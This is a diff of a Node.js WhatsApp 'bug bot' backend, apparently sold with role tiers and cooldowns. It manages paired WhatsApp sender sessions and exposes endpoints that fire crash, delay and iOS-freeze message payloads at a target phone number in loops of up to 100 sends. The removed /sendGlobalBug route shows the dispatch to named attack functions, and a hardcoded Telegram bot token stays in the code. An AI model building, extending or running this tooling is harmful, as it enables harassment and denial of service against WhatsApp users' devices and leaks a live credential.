@@ -33,6 +33,21 @@ process.stderr.write = (chunk, encoding, callback) => {
 
 const safeExit = process.exit;
 const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@whiskeysockets/baileys");
+
+// ============ GLOBAL SENDER CONFIG & HELPERS ============
+const allowedRolesForGlobal = ["owner", "admin", "patner", "partner", "reseller"];
+
+function canAccessGlobalSender(user) {
+  if (!user) return false;
+  const role = String(user.role || "").toLowerCase();
+  return allowedRolesForGlobal.includes(role);
+}
+
+const activeConnections = {};
+const biz = {};
+const mess = {};
+// ========================================================
+
 const express = require("express");
 const readline = require("readline");
 const crypto = require("crypto");
@@ -193,17 +208,6 @@ const lockChats = {};
 
 if (fs.existsSync(CHAT_FILE)) {
   chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
-}
-
-function saveChat() {
-  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
-}
-
-function sanitize(input) {
-  return String(input)
-    .replace(/[<>]/g, '')
-    .replace(/[\r\n]/g, ' ')
-    .slice(0, 250);
 }
 
 const TOKEN = "8829993520:AAGTRvok8t63XQUsFh1K5fC9wqyYyfSTc5E";
@@ -1629,7 +1633,7 @@ app.get("/getPairing", async (req, res) => {
       const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
       if (!isLoggedOut) {
         console.log(`🔄 Reconnecting ${number}...`);
-        await waiting(3000);
+        await sleep(3000);
         await pairingWa(number, user.username);
       } else {
         delete activeConnections[number];
@@ -1637,7 +1641,7 @@ app.get("/getPairing", async (req, res) => {
     }
   });
   if (!sock.authState.creds.registered) {
-    await waiting(1000);
+    await sleep(1000);
     let code = await sock.requestPairingCode(number);
     console.log(code)
     if (code) {
@@ -1654,387 +1658,7 @@ app.get("/getPairing", async (req, res) => {
 // ============ GLOBAL SENDER MANAGEMENT ENDPOINTS ============
 
 // Get all global senders
-app.get("/getGlobalSenders", (req, res) => {
-  const { key } = req.query;
-  const keyInfo = activeKeys[key];
-  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
-  
-  const db = loadDatabase();
-  const user = db.find(u => u.username === keyInfo.username);
-  if (!user || !["owner", "dev", "pemilikan", "admin"].includes(user.role)) {
-    return res.json({ valid: false, message: "Access denied" });
-  }
-  
-  const globalSenders = loadGlobalSenders();
-  
-  // Format untuk APK
-  const formattedSenders = globalSenders.map(sender => ({
-    id: sender.id,
-    sessionName: sender.sessionName,
-    number: sender.number,
-    owner: sender.owner,
-    addedAt: sender.addedAt,
-    isConnected: !!activeConnections[sender.sessionName],
-    status: activeConnections[sender.sessionName] ? "connected" : "disconnected",
-    type: "global"
-  }));
-  
-  res.json({
-    valid: true,
-    globalSenders: formattedSenders,
-    total: formattedSenders.length,
-    connected: formattedSenders.filter(s => s.isConnected).length
-  });
-});
-
-// Pair new global sender
-app.get("/pairGlobalSender", async (req, res) => {
-  const { key, number } = req.query;
-  const keyInfo = activeKeys[key];
-  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
-  
-  const db = loadDatabase();
-  const user = db.find(u => u.username === keyInfo.username);
-  if (!user || !["owner", "dev", "pemilikan", "admin"].includes(user.role)) {
-    return res.json({ valid: false, message: "Access denied" });
-  }
-  
-  if (!number || number.length < 9) {
-    return res.json({ valid: false, message: "Valid number required" });
-  }
-  
-  const cleanNumber = number.replace(/\D/g, '');
-  const sessionName = `global_${cleanNumber}_${Date.now()}`;
-  const sessionDir = path.join('permenmd', sessionName);
-  
-  try {
-    if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
-    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
-    
-    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-    const { version } = await fetchLatestBaileysVersion();
-    
-    const sock = makeWASocket({
-      auth: state,
-      printQRInTerminal: false,
-      logger: pino({ level: "silent" }),
-      version: version,
-      defaultQueryTimeoutMs: undefined,
-      browser: ["Chrome (Linux)", "Ubuntu", "10.0.0"]
-    });
-    
-    sock.ev.on("creds.update", saveCreds);
-    
-    let pairingCode = null;
-    let isConnected = false;
-    
-    sock.ev.on("connection.update", async (update) => {
-      const { connection, lastDisconnect } = update;
-      
-      if (connection === "close") {
-        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
-        if (!isLoggedOut && !isConnected) {
-          console.log(`🔄 Global sender ${cleanNumber} reconnecting...`);
-          setTimeout(() => connectGlobalSender(sessionName, sessionDir), 3000);
-        } else {
-          delete activeConnections[sessionName];
-        }
-      } else if (connection === "open") {
-        isConnected = true;
-        console.log(`✅ Global sender ${sessionName} connected!`);
-        activeConnections[sessionName] = sock;
-        
-        // Save to global senders database
-        const globalSenders = loadGlobalSenders();
-        const existingIndex = globalSenders.findIndex(s => s.number === cleanNumber);
-        
-        const senderData = {
-          id: existingIndex !== -1 ? globalSenders[existingIndex].id : Date.now().toString(),
-          sessionName: sessionName,
-          number: cleanNumber,
-          owner: keyInfo.username,
-          addedAt: new Date().toISOString(),
-          status: "active"
-        };
-        
-        if (existingIndex !== -1) {
-          globalSenders[existingIndex] = senderData;
-        } else {
-          globalSenders.push(senderData);
-        }
-        saveGlobalSenders(globalSenders);
-        
-        // Copy creds to root
-        const sourceCreds = path.join(sessionDir, 'creds.json');
-        const destCreds = path.join('permenmd', `${sessionName}.json`);
-        if (fs.existsSync(sourceCreds)) {
-          fs.writeFileSync(destCreds, fs.readFileSync(sourceCreds));
-        }
-      }
-    });
-    
-    // Request pairing code
-    await new Promise(r => setTimeout(r, 1000));
-    pairingCode = await sock.requestPairingCode(cleanNumber);
-    
-    if (pairingCode) {
-      console.log(`[GLOBAL PAIR] Code for ${cleanNumber}: ${pairingCode}`);
-      return res.json({
-        valid: true,
-        number: cleanNumber,
-        pairingCode: pairingCode,
-        isGlobal: true,
-        sessionName: sessionName
-      });
-    }
-    
-    return res.json({ valid: false, message: "Failed to get pairing code" });
-    
-  } catch (err) {
-    console.error("Global pairing error:", err.message);
-    return res.status(500).json({ valid: false, error: err.message });
-  }
-});
-
 // Send bug using global sender
-app.get("/sendGlobalBug", async (req, res) => {
-  const { key, bug, target, senderId } = req.query;
-  let cleanTarget = (target || "").replace(/\D/g, "");
-  
-  const keyInfo = activeKeys[key];
-  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
-  
-  const db = loadDatabase();
-  const user = db.find(u => u.username === keyInfo.username);
-  if (!user) return res.json({ valid: false, message: "User not found" });
-  
-  // Cooldown for global send
-  const roleCooldowns = { member: 300, reseller: 240, reseller1: 60, owner: 0, vip: 60, pemilikan: 0, dev: 0 };
-  const role = user.role || "member";
-  const cooldownSeconds = roleCooldowns[role] || 60;
-  
-  if (!user.lastGlobalSend) user.lastGlobalSend = 0;
-  const now = Date.now();
-  const diffSeconds = Math.floor((now - user.lastGlobalSend) / 1000);
-  
-  if (diffSeconds < cooldownSeconds) {
-    return res.json({
-      valid: true,
-      sended: false,
-      cooldown: true,
-      wait: cooldownSeconds - diffSeconds,
-    });
-  }
-  
-  // Get global sender
-  const globalSenders = loadGlobalSenders();
-  let targetSender = null;
-  
-  if (senderId) {
-    targetSender = globalSenders.find(s => s.id === senderId);
-  } else {
-    // Use first connected sender
-    targetSender = globalSenders.find(s => activeConnections[s.sessionName]);
-  }
-  
-  if (!targetSender) {
-    return res.json({ valid: false, message: "No active global sender available" });
-  }
-  
-  const sock = activeConnections[targetSender.sessionName];
-  if (!sock) {
-    return res.json({ valid: false, message: "Global sender not connected" });
-  }
-  
-  user.lastGlobalSend = now;
-  saveDatabase(db);
-  
-  res.json({
-    valid: true,
-    sended: true,
-    cooldown: false,
-    role: role,
-    sender: targetSender.sessionName,
-    senderNumber: targetSender.number
-  });
-  
-  // Execute bug in background
-  setImmediate(async () => {
-    try {
-      const targetJid = cleanTarget + "@s.whatsapp.net";
-      console.log(`[🌐 GLOBAL BUG] Sending ${bug} to ${cleanTarget} via ${targetSender.sessionName}`);
-      
-      switch (bug) {
-        case "BebasSpam":
-          for (let i = 0; i < 20; i++) {
-            await KayzenDelayHard(sock, targetJid);
-            await sleep(1000);
-          }
-          break;
-        case "HardDX":
-          for (let i = 0; i < 100; i++) {
-            await VnXNewDelayHardInpis(sock, targetJid);
-            await sleep(1000);
-          }
-          break;
-        case "invisible":
-          for (let i = 0; i < 50; i++) {
-            await VnXNewDenglayHardInpis(sock, targetJid);
-            await sleep(1000);
-          }
-          break;
-        case "Crash?":
-          for (let i = 0; i < 30; i++) {
-            await urlloc(sock, targetJid);
-            await sleep(1000);
-          }
-          break;
-        case "Xblank":
-          for (let i = 0; i < 20; i++) {
-            await KayzenBlankClick(sock, targetJid);
-            await sleep(1000);
-          }
-          break;
-        case "delaygb":
-          for (let i = 0; i < 50; i++) {
-            await sepongGB(sock, targetJid);
-            await sleep(1000);
-          }
-          break;
-        case "ios_invis":
-          await iosTrashLocExtend(sock, targetJid);
-          break;
-        case "ios_noinvis":
-          for (let i = 0; i < 15; i++) {
-            await iOSxTend(sock, targetJid);
-          }
-          break;
-        default:
-          await KayzenDelayHard(sock, targetJid);
-          break;
-      }
-      
-      console.log(`[✅ GLOBAL BUG] Bug '${bug}' sent to ${cleanTarget}`);
-    } catch (err) {
-      console.warn(`[❌ GLOBAL BUG ERROR] ${err.message}`);
-    }
-  });
-});
-
-// Delete global sender
-app.delete("/deleteGlobalSender", (req, res) => {
-  const { key, senderId } = req.query;
-  const keyInfo = activeKeys[key];
-  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
-  
-  const db = loadDatabase();
-  const user = db.find(u => u.username === keyInfo.username);
-  if (!user || !["owner", "dev", "pemilikan", "admin"].includes(user.role)) {
-    return res.json({ valid: false, message: "Access denied" });
-  }
-  
-  const globalSenders = loadGlobalSenders();
-  const senderIndex = globalSenders.findIndex(s => s.id === senderId);
-  
-  if (senderIndex === -1) {
-    return res.json({ valid: false, message: "Global sender not found" });
-  }
-  
-  const sender = globalSenders[senderIndex];
-  
-  // Close connection if exists
-  if (activeConnections[sender.sessionName]) {
-    try {
-      activeConnections[sender.sessionName].ws?.close();
-      delete activeConnections[sender.sessionName];
-    } catch(e) {}
-  }
-  
-  // Delete session files
-  const sessionPath = path.join('permenmd', sender.sessionName);
-  if (fs.existsSync(sessionPath)) {
-    fs.rmSync(sessionPath, { recursive: true, force: true });
-  }
-  
-  const credsFile = path.join('permenmd', `${sender.sessionName}.json`);
-  if (fs.existsSync(credsFile)) {
-    fs.unlinkSync(credsFile);
-  }
-  
-  // Remove from list
-  globalSenders.splice(senderIndex, 1);
-  saveGlobalSenders(globalSenders);
-  
-  res.json({ valid: true, message: "Global sender deleted successfully" });
-});
-
-// Auto reconnect all global senders on startup
-async function connectAllGlobalSenders() {
-  const globalSenders = loadGlobalSenders();
-  console.log(`[🌐 GLOBAL] Found ${globalSenders.length} global senders in database`);
-  
-  for (const sender of globalSenders) {
-    await connectGlobalSender(sender.sessionName, path.join('permenmd', sender.sessionName));
-  }
-}
-
-async function connectGlobalSender(sessionName, sessionDir) {
-  if (activeConnections[sessionName]) {
-    console.log(`[🌐 GLOBAL] ${sessionName} already connected`);
-    return true;
-  }
-  
-  if (!fs.existsSync(sessionDir)) {
-    console.log(`[🌐 GLOBAL] Session dir ${sessionName} not found, skipping`);
-    return false;
-  }
-  
-  try {
-    const { state } = await useMultiFileAuthState(sessionDir);
-    const { version } = await fetchLatestBaileysVersion();
-    
-    const sock = makeWASocket({
-      auth: state,
-      printQRInTerminal: false,
-      logger: pino({ level: "silent" }),
-      version: version,
-      defaultQueryTimeoutMs: undefined,
-      browser: ["Chrome (Linux)", "Ubuntu", "10.0.0"]
-    });
-    
-    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
-      if (connection === "open") {
-        console.log(`[🌐 GLOBAL] ${sessionName} connected!`);
-        activeConnections[sessionName] = sock;
-        
-        // Update status in database
-        const globalSenders = loadGlobalSenders();
-        const sender = globalSenders.find(s => s.sessionName === sessionName);
-        if (sender) {
-          sender.status = "active";
-          saveGlobalSenders(globalSenders);
-        }
-      } else if (connection === "close") {
-        const statusCode = lastDisconnect?.error?.output?.statusCode;
-        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;
-        
-        if (!isLoggedOut) {
-          console.log(`[🌐 GLOBAL] ${sessionName} disconnected, reconnecting in 5s...`);
-          delete activeConnections[sessionName];
-          setTimeout(() => connectGlobalSender(sessionName, sessionDir), 5000);
-        } else {
-          console.log(`[🌐 GLOBAL] ${sessionName} logged out, please re-pair`);
-          delete activeConnections[sessionName];
-        }
-      }
-    });
-    
-    return true;
-  } catch (err) {
-    console.error(`[🌐 GLOBAL] Failed to connect ${sessionName}:`, err.message);
-    return false;
-  }
-}
 
 app.get("/createAccount", (req, res) => {
   const { key, newUser, pass, day } = req.query;
@@ -2145,350 +1769,11 @@ app.get('/ping', (req, res) => {
 
 // ============ PERBAIKAN GLOBAL SENDER - TAMBAHKAN DI BACKEND ============
 
-// 1. Tambahkan endpoint DELETE untuk private sender (yang belum ada)
-app.delete("/deleteSender", (req, res) => {
-  const { key, id } = req.query;
-  const username = getUserByKey(key);
-  if (!username) return res.json({ valid: false, message: "Invalid session key" });
-  
-  const db = loadDatabase();
-  const user = db.find(u => u.username === username);
-  if (!user) return res.json({ valid: false, message: "User not found" });
-  
-  // Cari sender berdasarkan ID
-  let found = false;
-  let deletedSession = null;
-  
-  // Cek di activeConnections
-  for (const [sessionName, sock] of Object.entries(activeConnections)) {
-    if (sessionName === id || sessionName.includes(id)) {
-      deletedSession = sessionName;
-      found = true;
-      break;
-    }
-  }
-  
-  if (!found) {
-    return res.json({ valid: false, message: "Sender not found" });
-  }
-  
-  // Tutup koneksi
-  if (activeConnections[deletedSession]) {
-    try {
-      activeConnections[deletedSession].ws?.close();
-      delete activeConnections[deletedSession];
-    } catch(e) {}
-  }
-  
-  // Hapus file session
-  const sessionPath = path.join('permenmd', user.username, deletedSession);
-  if (fs.existsSync(sessionPath)) {
-    fs.rmSync(sessionPath, { recursive: true, force: true });
-  }
-  
-  // Hapus file creds.json di root
-  const credsFile = path.join('permenmd', `${deletedSession}.json`);
-  if (fs.existsSync(credsFile)) {
-    fs.unlinkSync(credsFile);
-  }
-  
-  // Hapus dari biz/mess jika ada
-  if (biz[deletedSession]) delete biz[deletedSession];
-  if (mess[deletedSession]) delete mess[deletedSession];
-  
-  console.log(`[DELETE] Private sender ${deletedSession} deleted by ${username}`);
-  res.json({ valid: true, message: "Sender deleted successfully" });
-});
 
-// 2. Perbaiki fungsi connectGlobalSenders
-async function connectGlobalSenders() {
-  const globalSenders = loadGlobalSenders();
-  console.log(`[🌐 GLOBAL] Found ${globalSenders.length} global senders in database`);
-  
-  if (globalSenders.length === 0) {
-    console.log(`[🌐 GLOBAL] No global senders configured. Use /getGlobalPairing to add.`);
-    return;
-  }
-  
-  for (const sender of globalSenders) {
-    const sessionPath = path.join('permenmd', sender.sessionName);
-    const credsFile = path.join(sessionPath, 'creds.json');
-    const mainCredsFile = path.join('permenmd', `${sender.sessionName}.json`);
-    
-    console.log(`[🌐 GLOBAL] Processing ${sender.sessionName} (${sender.number})...`);
-    
-    if (!fs.existsSync(sessionPath)) {
-      console.log(`[⚠️ GLOBAL] Creating session folder for ${sender.sessionName}`);
-      fs.mkdirSync(sessionPath, { recursive: true });
-    }
-    
-    if (fs.existsSync(credsFile)) {
-      if (!fs.existsSync(mainCredsFile)) {
-        fs.writeFileSync(mainCredsFile, fs.readFileSync(credsFile));
-        console.log(`[📁 GLOBAL] Copied creds to root for ${sender.sessionName}`);
-      }
-      
-      if (!activeConnections[sender.sessionName]) {
-        console.log(`[🌐 GLOBAL] Connecting ${sender.sessionName}...`);
-        try {
-          await connectSession(sessionPath, sender.sessionName);
-          console.log(`[✅ GLOBAL] Connected ${sender.sessionName}`);
-        } catch (err) {
-          console.log(`[❌ GLOBAL] Failed to connect ${sender.sessionName}:`, err.message);
-        }
-      } else {
-        console.log(`[✅ GLOBAL] ${sender.sessionName} already connected`);
-      }
-    } else if (fs.existsSync(mainCredsFile)) {
-      console.log(`[📁 GLOBAL] Found creds in root for ${sender.sessionName}, moving...`);
-      fs.writeFileSync(credsFile, fs.readFileSync(mainCredsFile));
-      if (!activeConnections[sender.sessionName]) {
-        await connectSession(sessionPath, sender.sessionName);
-      }
-    } else {
-      console.log(`[❌ GLOBAL] No creds found for ${sender.sessionName}, need to re-pair`);
-      if (activeConnections[sender.sessionName]) {
-        delete activeConnections[sender.sessionName];
-      }
-    }
-  }
-}
-
-// 3. Tambahkan endpoint untuk cek status koneksi global sender
-app.get("/checkGlobalSenders", (req, res) => {
-  const { key } = req.query;
-  const username = getUserByKey(key);
-  if (!username) return res.json({ valid: false, message: "Invalid key" });
-  
-  const db = loadDatabase();
-  const user = db.find(u => u.username === username);
-  if (!user || !allowedRolesForGlobal.includes(user.role)) {
-    return res.json({ valid: false, message: "Access denied" });
-  }
-  
-  const globalSenders = loadGlobalSenders();
-  const statusList = globalSenders.map(sender => {
-    const isConnected = !!activeConnections[sender.sessionName];
-    const hasCreds = fs.existsSync(path.join('permenmd', sender.sessionName, 'creds.json'));
-    
-    return {
-      id: sender.id,
-      number: sender.number,
-      sessionName: sender.sessionName,
-      connected: isConnected,
-      hasCreds: hasCreds,
-      owner: sender.owner,
-      addedAt: sender.addedAt
-    };
-  });
-  
-  res.json({
-    valid: true,
-    total: globalSenders.length,
-    connected: statusList.filter(s => s.connected).length,
-    senders: statusList
-  });
-});
-
-// 4. Tambahkan endpoint reconnect manual
-app.post("/reconnectGlobalSender", async (req, res) => {
-  const { key, senderId } = req.body;
-  const username = getUserByKey(key);
-  if (!username) return res.json({ valid: false, message: "Invalid key" });
-  
-  const db = loadDatabase();
-  const user = db.find(u => u.username === username);
-  if (!user || !allowedRolesForGlobal.includes(user.role)) {
-    return res.json({ valid: false, message: "Access denied" });
-  }
-  
-  const globalSenders = loadGlobalSenders();
-  const sender = globalSenders.find(s => s.id === senderId);
-  
-  if (!sender) {
-    return res.json({ valid: false, message: "Global sender not found" });
-  }
-  
-  // Tutup koneksi lama
-  if (activeConnections[sender.sessionName]) {
-    try {
-      activeConnections[sender.sessionName].ws?.close();
-      delete activeConnections[sender.sessionName];
-    } catch(e) {}
-  }
-  
-  // Delay sebentar
-  await new Promise(r => setTimeout(r, 1000));
-  
-  // Reconnect
-  const sessionPath = path.join('permenmd', sender.sessionName);
-  if (fs.existsSync(sessionPath) && fs.existsSync(path.join(sessionPath, 'creds.json'))) {
-    await connectSession(sessionPath, sender.sessionName);
-    res.json({ valid: true, message: `Reconnecting ${sender.number}...`, sessionName: sender.sessionName });
-  } else {
-    res.json({ valid: false, message: "Session credentials not found, please re-pair" });
-  }
-});
-
-// 5. Perbaiki fungsi getGlobalPairing agar lebih reliable
-app.get("/getGlobalPairing", async (req, res) => {
-  const { key, number } = req.query;
-  const username = getUserByKey(key);
-  if (!username) return res.json({ valid: false, message: "Invalid session key" });
-
-  const db = loadDatabase();
-  const user = db.find(u => u.username === username);
-  
-  if (!user || !allowedRolesForGlobal.includes(user.role)) {
-    return res.json({ valid: false, message: "Only Owner, High, Admin, High Admin, Dev can add global senders" });
-  }
-
-  if (!number || number.length < 9) {
-    return res.json({ valid: false, message: "Valid number required" });
-  }
-
-  const cleanNumber = number.replace(/\D/g, '');
-  const sessionName = `global_${cleanNumber}`;
-  const sessionDir = path.join('permenmd', sessionName);
-
-  try {
-    // Buat folder session
-    if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
-    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
-
-    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-    const { version } = await fetchLatestBaileysVersion();
-
-    const sock = makeWASocket({
-      auth: state,
-      printQRInTerminal: false,
-      logger: pino({ level: "silent" }),
-      version: version,
-      defaultQueryTimeoutMs: undefined,
-    });
-
-    sock.ev.on("creds.update", saveCreds);
-
-    sock.ev.on("connection.update", async (update) => {
-      const { connection, lastDisconnect } = update;
-
-      if (connection === "close") {
-        const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
-        if (!isLoggedOut) {
-          console.log(`🔄 Global sender ${cleanNumber} disconnected, will retry...`);
-        } else {
-          console.log(`🚪 Global sender ${cleanNumber} logged out`);
-          delete activeConnections[sessionName];
-        }
-      } else if (connection === "open") {
-        console.log(`✅ Global sender ${sessionName} connected successfully!`);
-        activeConnections[sessionName] = sock;
-        
-        // Simpan creds ke root juga
-        const sourceCreds = path.join(sessionDir, 'creds.json');
-        const destCreds = path.join('permenmd', `${sessionName}.json`);
-        if (fs.existsSync(sourceCreds)) {
-          fs.writeFileSync(destCreds, fs.readFileSync(sourceCreds));
-        }
-        
-        // Simpan ke database globalSenders.json
-        const globalSenders = loadGlobalSenders();
-        const existingIndex = globalSenders.findIndex(s => s.number === cleanNumber);
-        const newId = Date.now().toString();
-        
-        const senderData = {
-          id: existingIndex !== -1 ? globalSenders[existingIndex].id : newId,
-          sessionName: sessionName,
-          number: cleanNumber,
-          owner: username,
-          addedAt: new Date().toISOString()
-        };
-        
-        if (existingIndex !== -1) {
-          globalSenders[existingIndex] = senderData;
-        } else {
-          globalSenders.push(senderData);
-        }
-        saveGlobalSenders(globalSenders);
-      }
-    });
-
-    if (!sock.authState.creds.registered) {
-      await new Promise(r => setTimeout(r, 1000));
-      let code = await sock.requestPairingCode(cleanNumber);
-      if (code) {
-        console.log(`[🌐 GLOBAL] Pairing code for ${cleanNumber}: ${code}`);
-        return res.json({ 
-          valid: true, 
-          number: cleanNumber, 
-          pairingCode: code,
-          isGlobal: true,
-          sessionName: sessionName
-        });
-      }
-    }
-    
-    // Jika sudah terdaftar, langsung return success
-    return res.json({
-      valid: true,
-      message: "Global sender already registered",
-      number: cleanNumber,
-      isGlobal: true
-    });
-
-  } catch (err) {
-    console.error("Global pairing error:", err.message);
-    return res.status(500).json({ valid: false, error: err.message });
-  }
-});
 
 // ============ UPDATE UI ENDPOINTS ============
 
 // Get all senders (private + global) untuk ditampilkan di APK
-app.get("/getAllSenders", (req, res) => {
-  const { key } = req.query;
-  const keyInfo = activeKeys[key];
-  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
-  
-  const db = loadDatabase();
-  const user = db.find(u => u.username === keyInfo.username);
-  if (!user) return res.json({ valid: false, message: "User not found" });
-  
-  // Get private senders
-  const privateConns = getActiveCredsInFolder(user.username);
-  const privateSenders = privateConns.map(c => ({
-    id: c.sessionName,
-    sessionName: c.sessionName,
-    number: c.sessionName,
-    type: "private",
-    status: "connected",
-    isGlobal: false
-  }));
-  
-  // Get global senders (only if user has access)
-  let globalSendersList = [];
-  if (["owner", "dev", "pemilikan", "admin"].includes(user.role)) {
-    const globalSenders = loadGlobalSenders();
-    globalSendersList = globalSenders.map(s => ({
-      id: s.id,
-      sessionName: s.sessionName,
-      number: s.number,
-      type: "global",
-      status: activeConnections[s.sessionName] ? "connected" : "disconnected",
-      isGlobal: true,
-      owner: s.owner
-    }));
-  }
-  
-  res.json({
-    valid: true,
-    senders: [...privateSenders, ...globalSendersList],
-    privateCount: privateSenders.length,
-    globalCount: globalSendersList.length
-  });
-});
-
-// ============ ONLINE USERS & ACTIVE CONNECTIONS ENDPOINTS ============
 
 app.get("/onlineUsers", (req, res) => {
     const { key } = req.query;
@@ -3356,14 +2641,9 @@ async function iOSxTend(sock, target) {
   });
 }
 
-const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));
-
 function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
-const activeConnections = {};
-const biz = {};
-const mess = {};
 
 function prepareAuthFolders() {
   const userId = "permenmd";
@@ -3410,29 +2690,32 @@ function detectWATypeFromCreds(filePath) {
   }
 }
 
-async function connectSession(folderPath, sessionName, retries = 100) {
+async function connectSession(folderPath, sessionName, retries = 5) {
   return new Promise(async (resolve) => {
     try {
-      const sessionsFold = `${folderPath}/${sessionName}`
-      const { state } = await useMultiFileAuthState(sessionsFold);
+      const sessionsFold = path.join(folderPath, sessionName);
+      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
       const { version } = await fetchLatestBaileysVersion();
 
-  const sock = makeWASocket({
-      auth: state,
-      printQRInTerminal: false,
-      logger: pino({ level: "silent" }),
-      version: version,
-      defaultQueryTimeoutMs: undefined,
-  });
+      const sock = makeWASocket({
+        auth: state,
+        printQRInTerminal: false,
+        logger: pino({ level: "silent" }),
+        version: version,
+        defaultQueryTimeoutMs: undefined,
+        browser: ["Chrome (Linux)", "Ubuntu", "10.0.0"]
+      });
+
+      sock.ev.on("creds.update", saveCreds);
 
       sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
         const statusCode = lastDisconnect?.error?.output?.statusCode;
-        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;
+        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 401 || statusCode === 403;
 
         if (connection === "open") {
           activeConnections[sessionName] = sock;
 
-          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
+          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
           console.log(`\n[${sessionName}] Connected. Type: ${type}`);
 
           if (type === "Business") {
@@ -3441,28 +2724,33 @@ async function connectSession(folderPath, sessionName, retries = 100) {
             mess[sessionName] = sock;
           }
 
-          resolve();
+          resolve(sock);
         } else if (connection === "close") {
-          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);
+          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}`);
 
-          if (statusCode === 440) {
-            delete activeConnections[sessionName];
-            fs.rmSync(folderPath, { recursive: true, force: true });
-          } else if (!isLoggedOut && retries > 0) {
-            await new Promise((r) => setTimeout(r, 3000));
+          delete activeConnections[sessionName];
+          delete biz[sessionName];
+          delete mess[sessionName];
+
+          if (isLoggedOut || statusCode === 440) {
+            console.log(`\n[${sessionName}] Logged out. Cleaning up...`);
+            if (fs.existsSync(sessionsFold)) {
+              fs.rmSync(sessionsFold, { recursive: true, force: true });
+            }
+            resolve(null);
+          } else if (retries > 0) {
+            console.log(`\n[${sessionName}] Reconnecting in 5s... (${retries} retries left)`);
+            await sleep(5000);
             resolve(await connectSession(folderPath, sessionName, retries - 1));
           } else {
-            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
-            fs.rmSync(folderPath, { recursive: true, force: true });
-            delete activeConnections[sessionName];
-            resolve();
+            console.log(`\n[${sessionName}] Max retries reached.`);
+            resolve(null);
           }
         }
       });
     } catch (err) {
-      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
-      console.log(err);
-      resolve();
+      console.log(`\n[${sessionName}] SKIPPED:`, err.message);
+      resolve(null);
     }
   });
 }
@@ -3543,7 +2831,7 @@ async function pairingWa(number, owner, attempt = 1) {
       const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
       if (!isLoggedOut) {
         console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
-        await waiting(3000);
+        await sleep(3000);
         await pairingWa(number, owner, attempt + 1);
       } else {
         delete activeConnections[number];
@@ -3554,7 +2842,7 @@ async function pairingWa(number, owner, attempt = 1) {
       const destCreds = path.join('permenmd', owner, `${number}.json`);
 
 try {
-  await waiting(3000)
+  await sleep(3000)
   if (fs.existsSync(sourceCreds)) {
     const data = fs.readFileSync(sourceCreds);
     fs.writeFileSync(destCreds, data);
@@ -3979,16 +3267,9 @@ Database: ${data.asn || "-"}
   }
 });
 
-function loadDB() {
-  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
-  return JSON.parse(fs.readFileSync("database.json"));
-}
-function saveDB(data) {
-  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
-}
 
 function doReset(role) {
-  const db = loadDB();
+  const db = loadDatabase();
   let deleted = [], remain = [];
 
   if (role === "all") {
@@ -4001,7 +3282,7 @@ function doReset(role) {
     }
   }
 
-  saveDB(remain);
+  saveDatabase(remain);
   fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");
 
   return deleted;
@@ -4416,156 +3697,316 @@ bot.onText(/^\/?restart$/, async (msg) => {
   }, 5000);
 });
 
-app.get("/globalSender", (req, res) => {
-  const { key } = req.query;
-  const username = getUserByKey(key);
-  if (!username) return res.status(401).json({ error: "Invalid session key" });
+app.get("/getAllSenders", (req, res) => {
+  try {
+    const { key } = req.query;
+    const username = getUserByKey(key);
+    if (!username) return res.json({ valid: false, message: "Invalid key" });
 
-  const globalSenders = loadGlobalSenders();
-  const activeGlobals = globalSenders.filter(s => activeConnections[s.sessionName]);
+    const db = loadDatabase();
+    const user = db.find(u => u.username === username);
+    if (!user) return res.json({ valid: false, message: "User not found" });
 
-  return res.json({
-    valid: true,
-    connections: activeGlobals.map(s => ({
-      id: s.id,
-      sessionName: s.sessionName,
-      owner: s.owner,
-      number: s.number
-    }))
-  });
+    // Get private senders
+    const privateConns = getActiveCredsInFolder(user.username);
+    const privateSenders = privateConns.map(c => ({
+      id: c.sessionName,
+      sessionName: c.sessionName,
+      number: c.sessionName,
+      type: "private",
+      status: "connected",
+      isGlobal: false
+    }));
+
+    // Get global senders (only if user has access)
+    let globalSendersList = [];
+    if (canAccessGlobalSender(user)) {
+      const globalSenders = loadGlobalSenders();
